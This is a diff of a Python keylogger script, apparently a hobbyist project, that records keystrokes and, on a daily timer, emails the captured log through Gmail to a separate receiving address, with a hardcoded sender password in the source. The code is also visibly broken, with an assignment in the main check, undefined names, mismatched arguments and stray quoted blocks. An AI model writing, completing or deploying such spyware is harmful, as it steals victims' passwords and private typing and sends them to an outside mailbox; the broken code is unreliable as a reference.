@@ -1,11 +1,23 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
+
+#what i could implement
 #strong ephases on classes and hierchy or inheritence/abstract classes
 #if the is an if or else statement turn it into a terinary statement
 #array list or collectrions
 #reading writting to files
+
+#getting keystrokes
 import keyboard
+
+#for emailing
 import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+#for measuring dates and timers
 from threading import Timer
 from datetime import datetime
 
@@ -14,9 +26,9 @@ from datetime import datetime
 EMAIL = "keypoggers@gmail.com"
 EMAILPASS = "ZDSBNJKHF!62ukzhgkuyfwuS@D%@!3ndhvgwe"
 SECINDAY = 86400
+EMAILRECIVE = "keypogreciver@gmail.com"
 
-
-class Keylogger:
+class keyLogger:
     def __init__(self,interval):
         self.interval = interval
        #the string that logs keystrokes
@@ -46,41 +58,67 @@ class Keylogger:
 
       self.log += name
 
-    def filename(self):
+
+    def naming(self):
         startDatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
         endDatestr = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{startDatestr}_{endDatestr}"
-        #f strings loooking iffy here idk if its vim but we'll see
+        self.filename = "keylog-"+str(startDatestr)+"-"+str(endDatestr)
+        #f strings loooking iffy here idk if its vim but we'll see used str() to work around
+"""
     def fileHandler(self):
         with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file = f)
 
         print(f"[+] Saved {self.filename}.txt")
-
-    def carrierPidgeon(self, email,password, message):
-        #sending the emaill
-
+"""
+    def carrierPidgeon(self,email,password,reciver,message):
+        #for using MIME    #def carrierPidgeon(self, email, password, reciver, message, subject):
+"""
+#for attatching files
+        #setting up MIMEMultipart (https://www.tutorialspoint.com/send-mail-with-attachment-from-your-gmail-account-using-python)
+        mime = MIMEMultipart()
+        mime['From'] = email
+        mime['To'] = reciver
+        mime['Subject'] = subject
+        
+        #body and attatchments
+#FINISH THIS
+"""
         #connect to mail server
         server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
         server.starttls()
-        #logging in time
+        #logging in
         server.login(email, password)
-
-        server.sendmail(email, email, message)
-        
-        server.quit
+        server.sendmail(email, reciver, message)        
+        server.quit()
 
     def report(self):
         if self.log:
             self.endDate = datetime.now()
-            self.filename()
-            self.sendmail(EMAIL, EMAILPASS, self.log)
-            self.fileHandler()
-        self.log = ""
+            #backing up to file
+           # self.handler()      for if i want files
+
+            #emailing
+            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVER, self.log, naming)
+            self.log = ""
 
         timer = Timer(interval=self.interval, function=self.report)
 
         timer.daemon = True
 
         timer.start()
+    def start(self):
+        self.startDate = datetime.now()
 
+        keyboard.on_release(keysTracking = self.keysTracking)
+
+        self.report()
+        keyboard.wait()
+
+
+
+
+if __name__ = '__main__':
+    keyLogger(interval=SECINDAY)
+    keyLogger.start()
+   
